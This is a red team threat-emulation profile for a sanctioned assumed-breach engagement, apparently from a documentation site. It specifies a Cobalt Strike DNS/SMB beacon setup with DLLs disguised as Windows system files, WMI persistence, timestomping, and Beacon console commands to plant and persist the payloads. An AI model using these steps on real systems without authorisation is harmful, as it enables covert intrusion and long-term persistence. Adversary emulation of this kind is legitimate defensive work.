---
title: "Threat Profile: CYBERSNAKE"
description: >
  CYBERSNAKE threat profile example
---

# Threat Profile (CYBERSNAKE)

:::tip
A modified version of this profile was used on an assumed breach engagement. This profile is provide as an example to show details that supported a real engagement. A key focus of this profile is the use of DNS for C2. 
:::

## Description

C2 threat inspired by the Snake Campaign & Cyber Espionage Toolkit uses DNS instead of HTTP for communications

>Reference: http://www.baesystems.com/en/cybersecurity/feature/the-snake-campaign

## Characteristics

 - C2 Backend: CobaltStrike
 - Port(s): 53, 445 (DNS, SMB)
 - C2 communication using DNS and SMB Traffic
 - Executes in browser only when browser is active
 - IP communication using DNS hostnames

Cobalt Strike HTTP Request Profile:

 - None

## System Modifications

### Files

#### SMB Payload

PATH: `C:\Windows\System32\KBDUS1.DLL`

Binary modified using a resource hacker to look similar to other Windows files 

 - File Description: United States Keyboard Layout Alternate
 - File Version: 6.1.7601.17514
 - Product Name: Microsoft(r) Windows(r) Operating System
 - Product Version: 6.1.7601.17514
 - Copyright: (c)Microsoft Corporation. All right reserved
 - Date Modified:  11/20/2010 4:29:11 PM

#### DNS Payload

PATH: `c:\windows\system32\wanAPI.dll`

Binary modified using a resource hacker to look similar to other Windows files

 - File Description: Mbnapi
 - File Version: 6.1.7600.16385
 - Product Name: Microsoft(r) Windows(r) Operating System
 - Product Version: 6.1.7600.16385
 - Copyright: (c)Microsoft Corporation. All right reserved
 - Date Modified: 07/13/2009 7:56:53 PM

## Registry
 
 - None

## WMI

 - SMB Beacon: WMI KBDMonitor Created containing start up code to launch a smb beacon at each reboot
 - DNS Beacon: WMI MSUpdate Created containing start up code to launch a dns beacon at each reboot

-----------------------------------------------------

## Deployment Steps

1. Create WMI script with file and path to payload
2. Build payloads using profile
3. Build 64 and 32 bit DLL files
4. Use a Resource Hacker utility to modify dll to match File Attributes
5. Deploy dll to target system
6. Verify time matches surrounding files (TimeStomp if needed)

## Persistence Steps (via CobaltStrike Beacon Console)

KBDUS1.dll (SMB Beacon)

```
cd c:\windows\temp
upload /data/PAYLOADS/fullstaged/64/KBDUS1.DLL
powershell-import /data/PAYLOADS/Set-FileTimeStamps.ps1
powershell Set-FileTimeStamps c:\windows\temp\KBDUS1.DLL "11/20/2010 4:29:11 PM"
shell move c:\windows\temp\KBDUS1.DLL c:\windows\system32
powershell-import /data/PAYLOADS/wmi_persistence_kbdus1.ps1
powershell Invoke-WMI-Persistence
```

wanAPI.dll (DNS Beacon)

```
cd c:\windows\temp
upload /data/PAYLOADS/staged/wanAPI.dll
powershell-import /data/PAYLOADS/Set-FileTimeStamps.ps1
powershell Set-FileTimeStamps c:\windows\temp\wanAPI.dll "07/13/2009 7:56:53 PM"
shell move c:\windows\temp\wanAPI.dll c:\windows\system32
powershell-import /data/PAYLOADS/wmi_persistence_wanapi.ps1
powershell Invoke-WMI-Persistence
```